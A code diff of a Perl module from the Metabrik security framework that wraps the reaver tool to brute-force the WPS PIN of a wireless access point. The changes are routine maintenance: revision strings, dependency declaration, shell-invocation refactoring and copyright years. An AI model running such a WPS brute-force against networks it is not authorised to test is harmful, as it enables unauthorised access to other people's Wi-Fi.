@@ -1,5 +1,5 @@
 #
-# $Id: Wps.pm 360 2014-11-16 14:52:06Z gomor $
+# $Id: Wps.pm,v eff9afda3723 2015/01/04 12:34:23 gomor $
 #
 # network::wps Brik
 #
@@ -11,13 +11,13 @@ use base qw(Metabrik::Network::Wlan);
 
 sub brik_properties {
    return {
-      revision => '$Revision: 360 $',
+      revision => '$Revision: eff9afda3723 $',
       tags => [ qw(unstable wifi wlan network wps) ],
       commands => {
          brute_force_wps => [ qw(essid bssid|OPTIONAL) ],
       },
-      require_used => {
-         'shell::command' => [ ],
+      require_modules => {
+         'Metabrik::Shell::Command' => [ ],
       },
       require_binaries => {
          'sudo', => [ ],
@@ -62,7 +62,9 @@ sub brute_force_wps {
    my $monitor = $self->start_monitor_mode or return;
 
    my $cmd = "sudo reaver -i $monitor -b $bssid -vv";
-   my $r = $context->run('shell::command', 'system', $cmd);
+
+   my $shell_command = Metabrik::Shell::Command->new_from_brik($self);
+   my $r = $shell_command->system($cmd);
 
    $self->stop_monitor_mode;
 
@@ -79,7 +81,7 @@ Metabrik::Network::Wps - network::wps Brik
 
 =head1 COPYRIGHT AND LICENSE
 
-Copyright (c) 2014, Patrice E<lt>GomoRE<gt> Auffret
+Copyright (c) 2014-2015, Patrice E<lt>GomoRE<gt> Auffret
 
 You may distribute this module under the terms of The BSD 3-Clause License.
 See LICENSE file in the source distribution archive.
